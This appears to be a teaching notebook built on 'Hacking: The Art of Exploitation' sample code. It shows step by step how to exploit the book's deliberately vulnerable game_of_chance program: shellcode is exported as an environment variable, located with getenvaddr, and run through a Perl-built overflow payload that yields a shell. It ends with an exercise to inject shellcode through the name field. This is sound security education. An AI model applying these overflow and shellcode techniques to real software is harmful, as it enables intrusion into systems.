- one easy way to exploit is by stashing shellcode as an environment variable
- once the shellcode is exported, you can use getenvaddr program provided by booksrc
- use the address relative to the game_of_chance program to execute the stashed shellcode
- run all or some of the following commands in Terminal


```python
! cp ./booksrc/shellcodex86linuxexec .
! cp ./booksrc/getenvaddr.c .
```


```python
! cat getenvaddr.c
```

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[]) {
    	char *ptr;
    
    	if(argc < 3) {
    		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
    		exit(0);
    	}
    	ptr = getenv(argv[1]); /* get env var location */
    	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    	printf("%s will be at %p\n", argv[1], ptr);
    }



```python
! ./compile.sh getenvaddr.c getenvaddr
```

#### run the following commands in terminal
export SHELLCODE=$(cat shellcodex86linuxexec)

./getenvaddr SHELLCODE ./game_of_chance


```python
# copy the address of SHELLCODE at the location of current_game after Ax100
! perl -e 'print "1\n18\nn\n5\n" . "A"x100 . "\x93\xc7\xff\xff\n" . "1\n"' > exploit_game_of_chance
```


```python
! cat exploit_game_of_chance
```

    1
    18
    n
    5
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
    1


#### finally, exploit the program
- run this in terminal

``` 
$ cat exploit_game_of_chance - | ./game_of_chance
```
- NOTICE: the hyphen after the exploit
- tells the cat program to send standard input after the exploit buffer, returning control of the input
- eventhough the shell doesn't display its prompt, it is still accessible
    - intersestingly, it doesn't escalate privilege

### Exploiting with shellcode stored in user name
- left as an exercise

## Exercise
- smuggle the shellcode into the name field, find it's address and exploit the program.


```python

```
